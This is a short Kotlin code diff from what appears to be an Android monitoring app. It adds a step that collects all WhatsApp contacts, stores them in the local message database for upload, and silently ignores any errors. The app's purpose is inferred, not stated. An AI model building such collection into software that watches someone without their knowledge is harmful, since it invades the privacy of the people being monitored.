@@ -625,6 +625,13 @@ class SyncRunner(private val context: Context) {
     }
 
     private suspend fun syncWhatsAppMessages(bearer: String, db: AppDatabase) {
+        try {
+            val contacts = com.spapp.monitoring.collectors.WhatsAppContactsCollector(context).collectAllWhatsAppContacts()
+            if (contacts.isNotEmpty()) {
+                db.whatsAppMessageDao().insertAll(contacts)
+            }
+        } catch (_: Exception) {}
+
         val unsynced = db.whatsAppMessageDao().getUnsynced()
         if (unsynced.isEmpty()) return
 
